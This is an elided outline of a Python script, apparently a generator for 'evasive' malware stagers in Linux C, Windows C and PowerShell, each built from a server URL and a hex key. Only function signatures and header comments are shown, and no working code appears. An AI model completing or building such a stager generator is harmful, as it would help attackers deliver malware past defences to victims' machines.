...
def generate_c_stager_linux(server_url, key_hex):
    ...
    return f'''// BTY Evasive Linux Stager
...
def generate_c_stager_windows(server_url, key_hex):
    ...
    return f'''// BTY Evasive Windows Stager
...
def generate_ps_stager(server_url, key_hex):
    ...
    return f'''# BTY Evasive PowerShell Stager
...
def main():
    ...
    parser = argparse.ArgumentParser(description="BTY Evasive Stager Generator")
